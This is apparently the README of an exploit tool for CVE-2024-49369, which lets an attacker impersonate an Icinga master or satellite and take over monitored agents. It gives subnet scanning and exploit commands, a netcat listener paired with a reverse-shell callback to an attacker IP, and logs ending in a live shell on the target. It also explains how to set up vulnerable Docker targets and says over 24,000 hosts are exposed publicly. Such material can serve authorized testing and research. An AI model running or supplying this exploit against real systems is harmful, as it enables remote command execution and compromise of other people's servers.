# CVE-2024-49369

## Overview
This vulnerability leverages the Icinga JSON-RPC protocol to exploit monitored nodes running Icinga agents. By impersonating a Master/Satellite instance, attackers can potentially take over agents, execute arbitrary commands, or gain sensitive information.

---

## How to Use

### Scanning
To scan a subnet for vulnerable agents, run the following command:
```bash
python3 main.py scan --subnet 192.168.0.0/24 --vuln --batch 25
```
This scans the specified subnet in batches of 25 IPs. The tool sends an `Icinga::HELLO` message over the JSON-RPC protocol and identifies responding agents along with their versions.

---

### Exploiting
If configuration and command execution is enabled on an endpoint (the default setting for monitored nodes with Icinga agents), an attacker can:

1. Impersonate a Master/Satellite instance.
2. Update the endpoint configuration.
3. Execute arbitrary commands on the endpoint.

This can lead to full system compromise (depending on the service user) or limited access.

#### Prerequisites
- Network disruptions or a restart of the target: The Icinga agent automatically rejects new connections from the same Master/Satellite instance until the existing connection is severed.
  
When the parent node is still connected, the exploit connections will look like this in the log:
```
[2024-12-11 09:13:03 -0500] information/ApiListener: New client connection for identity 'my_satellite' from [::ffff:192.168.0.1]:48120
[2024-12-11 09:13:04 -0500] information/ApiListener: New client connection for identity 'my_satellite' from [::ffff:192.168.0.1]:48124 (certificate validation failed: code 18: self signed certificate)
[2024-12-11 09:13:04 -0500] warning/ApiListener: No data received on new API connection from [::ffff:192.168.0.1]:48124 for identity 'my_satellite'. Ensure that the remote endpoints are properly configured in a cluster setup.
```
We can see this node is vulnerable to the attack as the warning for clusters is triggering, meaning that the current satellite is still connected, but this agent sees us as a valid parent.

#### Steps
1. Start a Netcat listener for the reverse shell:
   ```bash
   nc -lvnp 9001
   ```

2. Launch the exploit:
   ```bash
   python3 main.py exploit --host 192.168.0.5 --node-cn icinga_master --zone master --revip 192.168.0.1 --revport 9001
   ```
   - **`--host`**: Target agent's IP address.
   - **`--node-cn`**: Common name of the Master/Satellite to impersonate.
   - **`--zone`**: Targeted zone name. Default is `master`.
   - **`--revip`**: Attacker's IP address for reverse shell.
   - **`--revport`**: Attacker's port for reverse shell.

This command initiates repeated connection attempts. Once the target agent disconnects from its current parent, the tool takes over, sending and receiving checks.

#### Example Payload

A Perl-based reverse shell is used as part of a new check created by the tool.

---

### Information Leakage
Even if configuration and command execution are disabled on the target, attackers may still glean sensitive data by observing the results of checks sent to the agent.

#### Example Response Data
```json
{
  "jsonrpc": "2.0",
  "method": "config::UpdateObject",
  "params": {
    "config": "object Downtime ...",
    "name": "icinga-agent!load!9856e6b2...",
    "type": "Downtime",
    "version": 1733899523.67197
  }
}
```
```json
{
  "jsonrpc": "2.0",
  "method": "event::SetLastCheckStarted",
  "params": {
    "host": "icinga-agent",
    "last_check_started": 1733899492.313578,
    "service": "icinga"
  },
  "ts": 1733899492.313714
}
```
These responses may reveal sensitive configurations, scheduling data, or even the results of monitored services.

---

## Impact
On Censys there are currently 24,003 hosts with a publicly facing Icinga port. Spot checks indicate that most hosts are still running a vulnerable version of Icinga.

---

## Credits
This research builds on the work discussed in [Icinga's blog](https://icinga.com/blog/uncovering-a-client-certificate-verification-bypass-in-icinga/).

---

## Notes
- Always use this tool responsibly and within the scope of authorized security testing.
- Vulnerability exploitation may have serious consequences. Verify legal permissions before usage.


# Docker
## Build
```
docker build -f Dockerfile -t icinga-exploit .
```
## Run Exploit
```
docker run -it icinga-exploit exploit --host my_icinga_agent_with_satellite --revip 192.168.0.1 --revport 9001 --node-cn my_satellite --zone master
...+...+.......+......+.....+...+.......+............+..+...+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.....+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*........+......+.+...............+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
.+.....+...+.+.....+...+.+...........+....+.........+...+........+.+......+...+............+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.........+............+.....+....+.....+.........+.+.........+...+........+....+.................+....+......+...........+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.....+....+..+.......+......+...........+...+...+...+.+......+..+...+...+....+...+...............+.....+...+.+......+............+..+....+.....+......+...+............+....+.........+.....+.+..+....+...+.................+.+...+.....+.......+..+...+...+....+.................+......+....+...+............+......+..................+.....+.........+.+..+....+......+..............+....+.........+...............+..+....+.........+..................+..+.............+............+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-----
.+.........+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*......+...+.......+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*..+.+.....+...+......+................+.....+.........+.........+....+...........+....+..+....+.....+.+......+........+.+...+..+.+..................+.....+.........+...+...................+........+.+..+...+.+...+..+....+.....+......+.+.................+..........+...+.....+.......+..+.+..+.+..+.......+........+...+.+..............+...............+.......+..+.+.....+.........+...+.........+....+.....+............+.........+....+.....+....+...+............+...+..............+...+.+.........+........+..........+.....+...+....+..+.+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
.......+...............+......+...+..+.............+......+..+...+.+.....+.........+..........+..+.......+...+.....+...+......+.+........+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*...+.........+.+............+..+.......+...........+...+.+......+...+...........+.+.........+.........+..+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*....+..........+.....+....+.....+......+...+.......+...+..+..........+..............+....+.....+.+.....................+............+...+...+.........+......+.....+....+............+.....+..................+...+...+.........+......+.......+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-----
INFO:root:Connected to endpoint: my_icinga_agent_with_satellite
INFO:root:Response JSON: {'jsonrpc': '2.0', 'method': 'icinga::Hello', 'params': {'capabilities': 1, 'version': 21302}}
INFO:root:Connection closed by server, this usually indicates that there is a satellite/master already connected. Retrying...
INFO:root:Connected to endpoint: my_icinga_agent_with_satellite
INFO:root:Response JSON: {'jsonrpc': '2.0', 'method': 'icinga::Hello', 'params': {'capabilities': 1, 'version': 21302}}
INFO:root:Connection closed by server, this usually indicates that there is a satellite/master already connected. Retrying...
INFO:root:Connected to endpoint: my_icinga_agent_with_satellite
INFO:root:Response JSON: {'jsonrpc': '2.0', 'method': 'icinga::Hello', 'params': {'capabilities': 1, 'version': 21302}}
INFO:root:Connection closed by server, this usually indicates that there is a satellite/master already connected. Retrying...
INFO:root:Connected to endpoint: my_icinga_agent_with_satellite
INFO:root:Response JSON: {'jsonrpc': '2.0', 'method': 'icinga::Hello', 'params': {'capabilities': 1, 'version': 21302}}
INFO:root:Connection closed by server, this usually indicates that there is a satellite/master already connected. Retrying...
INFO:root:(104, 'ECONNRESET')
INFO:root:Connected to endpoint: my_icinga_agent_with_satellite
INFO:root:Response JSON: {'jsonrpc': '2.0', 'method': 'icinga::Hello', 'params': {'capabilities': 1, 'version': 21302}}
INFO:root:Connection closed by server, this usually indicates that there is a satellite/master already connected. Retrying...
INFO:root:Connected to endpoint: my_icinga_agent_with_satellite
INFO:root:Response JSON: {'jsonrpc': '2.0', 'method': 'icinga::Hello', 'params': {'capabilities': 1, 'version': 21302}}
INFO:root:Connection closed by server, this usually indicates that there is a satellite/master already connected. Retrying...
INFO:root:Connected to endpoint: my_icinga_agent_with_satellite
INFO:root:Response JSON: {'jsonrpc': '2.0', 'method': 'icinga::Hello', 'params': {'capabilities': 1, 'version': 21302}}
INFO:root:Connection closed by server, this usually indicates that there is a satellite/master already connected. Retrying...
INFO:root:Connected to endpoint: my_icinga_agent_with_satellite
INFO:root:Response JSON: {'jsonrpc': '2.0', 'method': 'icinga::Hello', 'params': {'capabilities': 1, 'version': 21302}}
INFO:root:Connection closed by server, this usually indicates that there is a satellite/master already connected. Retrying...
INFO:root:Connected to endpoint: my_icinga_agent_with_satellite
INFO:root:Response JSON: {'jsonrpc': '2.0', 'method': 'icinga::Hello', 'params': {'capabilities': 1, 'version': 21302}}
INFO:root:Connection closed by server, this usually indicates that there is a satellite/master already connected. Retrying...
INFO:root:[('SSL routines', '', 'shutdown while in init')]
INFO:root:Connected to endpoint: my_icinga_agent_with_satellite
INFO:root:Response JSON: {'jsonrpc': '2.0', 'method': 'icinga::Hello', 'params': {'capabilities': 1, 'version': 21302}}
INFO:root:Response JSON: {'jsonrpc': '2.0', 'method': 'pki::RequestCertificate', 'params': {'ticket': ''}}
INFO:root:Received RequestCertificate
Certificate request self-signature ok
subject=CN = my_satellite
INFO:root:Response JSON: {'jsonrpc': '2.0', 'method': 'event::ExecutedCommand', 'params': {'end': 1733925296.124675, 'execution': 'unique-execution-id', 'exit': 3, 'host': 'my_icinga_agent_with_satellite', 'output': "Check command 'icinga_exploit' does not exist.", 'service': 'icinga_exploit', 'start': 1733925296.124675}}
INFO:root:Received ExecutedCommand
INFO:root:Sending config update
INFO:root:(-1, 'Unexpected EOF')
INFO:root:Connected to endpoint: my_icinga_agent_with_satellite
INFO:root:Response JSON: {'jsonrpc': '2.0', 'method': 'icinga::Hello', 'params': {'capabilities': 1, 'version': 21302}}
INFO:root:Connection closed by server, this usually indicates that there is a satellite/master already connected. Retrying...
INFO:root:(104, 'ECONNRESET')
INFO:root:Connected to endpoint: my_icinga_agent_with_satellite
INFO:root:Response JSON: {'jsonrpc': '2.0', 'method': 'icinga::Hello', 'params': {'capabilities': 1, 'version': 21302}}
INFO:root:Response JSON: {'jsonrpc': '2.0', 'method': 'pki::RequestCertificate', 'params': {'ticket': ''}}
INFO:root:Received RequestCertificate
Certificate request self-signature ok
subject=CN = my_satellite
INFO:root:Response JSON: {'jsonrpc': '2.0', 'method': 'event::ExecutedCommand', 'params': {'end': 1733925305.051298, 'execution': 'unique-execution-id', 'exit': 3, 'host': 'my_icinga_agent_with_satellite', 'output': "Check command 'icinga_exploit' does not exist.", 'service': 'icinga_exploit', 'start': 1733925305.051298}}
INFO:root:Received ExecutedCommand
INFO:root:Sending config update
INFO:root:(104, 'ECONNRESET')
INFO:root:Connected to endpoint: my_icinga_agent_with_satellite
INFO:root:Response JSON: {'jsonrpc': '2.0', 'method': 'icinga::Hello', 'params': {'capabilities': 1, 'version': 21302}}
INFO:root:Connection closed by server, this usually indicates that there is a satellite/master already connected. Retrying...
INFO:root:(104, 'ECONNRESET')
INFO:root:Connected to endpoint: my_icinga_agent_with_satellite
INFO:root:Response JSON: {'jsonrpc': '2.0', 'method': 'icinga::Hello', 'params': {'capabilities': 1, 'version': 21302}}
INFO:root:Response JSON: {'jsonrpc': '2.0', 'method': 'pki::RequestCertificate', 'params': {'ticket': ''}}
INFO:root:Received RequestCertificate
Certificate request self-signature ok
subject=CN = my_satellite
INFO:root:Response JSON: {'jsonrpc': '2.0', 'method': 'event::ExecutedCommand', 'params': {'end': 1733925313.881199, 'execution': 'unique-execution-id', 'exit': 3, 'host': 'my_icinga_agent_with_satellite', 'output': "Check command 'icinga_exploit' does not exist.", 'service': 'icinga_exploit', 'start': 1733925313.881199}}
INFO:root:Received ExecutedCommand
INFO:root:Sending config update
INFO:root:Connected to endpoint: my_icinga_agent_with_satellite
INFO:root:Response JSON: {'jsonrpc': '2.0', 'method': 'icinga::Hello', 'params': {'capabilities': 1, 'version': 21302}}
INFO:root:Response JSON: {'jsonrpc': '2.0', 'method': 'pki::RequestCertificate', 'params': {'ticket': ''}}
INFO:root:Received RequestCertificate
Certificate request self-signature ok
subject=CN = my_satellite
INFO:root:Response JSON: {'jsonrpc': '2.0', 'method': 'event::Heartbeat', 'params': {}}
INFO:root:Response JSON: {'jsonrpc': '2.0', 'method': 'event::SetLastCheckStarted', 'params': {'host': 'localhost', 'last_check_started': 1733925340.30785, 'service': 'icinga_exploit'}, 'ts': 1733925340.307906}
INFO:root:Response JSON: {'jsonrpc': '2.0', 'method': 'event::Heartbeat', 'params': {}}
```

At this point the reverse shell is active:
```
nc -lvnp 9001                                                                                                                                                            
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.225.12.77.
Ncat: Connection from 10.225.12.77:40404.
sh: cannot set terminal process group (-1): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ whoami
whoami
icinga
sh-4.4$ 
```

### Local Icinga master for testing

````
# run the vulnerable master node
docker run --rm --hostname icinga_master --name icinga_master -p 5665:5665 -e ICINGA_MASTER=1 -e ICINGA_ACCEPT_CONFIG=1 -e ICINGA_ACCEPT_COMMANDS=1 icinga/icinga2:2.14.2

# exploit it
python3 main.py exploit --host 127.0.0.1 --node-cn icinga_master --zone master --revip <IP> --revport <PORT>
````

### Local Icinga agent for testing

#### Create a random new CA and certificate
```
mkdir /tmp/icinga_poc_certs

cd /tmp/icinga_poc_certs/
openssl genrsa -out /tmp/icinga_poc_certs/icinga-agent.key 2048
openssl req -new -key /tmp/icinga_poc_certs/icinga-agent.key -out /tmp/icinga_poc_certs/icinga-agent.csr \
    -subj "/C=US/ST=YourState/L=YourCity/O=YourOrganization/CN=icinga-agent"
openssl genrsa -out /tmp/icinga_poc_certs/icinga-ca.key 2048
openssl req -x509 -new -nodes -key /tmp/icinga_poc_certs/icinga-ca.key -sha256 -days 3650 \
    -subj "/C=US/ST=YourState/L=YourCity/O=YourOrganization/CN=icinga-ca" \
    -out /tmp/icinga_poc_certs/icinga-ca.crt
openssl x509 -req -in icinga-agent.csr -CA /tmp/icinga_poc_certs/icinga-ca.crt -CAkey /tmp/icinga_poc_certs/icinga-ca.key -CAcreateserial -out /tmp/icinga_poc_certs/icinga-agent.crt -days 3650 -sha256
mkdir -p icinga-agent/var/lib/icinga2/certs/
cp /tmp/icinga_poc_certs/icinga-agent.crt icinga-agent/var/lib/icinga2/certs/icinga-agent.crt
cp /tmp/icinga_poc_certs/icinga-ca.crt icinga-agent/var/lib/icinga2/certs/ca.crt

docker run --rm \
    -p 5665:5665 \
	-h icinga-agent \
	-v ./icinga-agent:/data:z \
	-e ICINGA_ZONE=icinga-agent \
	-e ICINGA_ENDPOINT=icinga-master,icinga-master,5665 \
    -e ICINGA_ACCEPT_CONFIG=1 \
	icinga/icinga2:2.14.2  icinga2 feature enable debuglog

docker run --rm \
    -p 5665:5665 \
	-h icinga-agent \
	-v ./icinga-agent:/data:z \
	-e ICINGA_ZONE=icinga-agent \
	-e ICINGA_ENDPOINT=icinga-master,icinga-master,5665 \
    -e ICINGA_ACCEPT_CONFIG=1 \
	icinga/icinga2:2.14.2
```

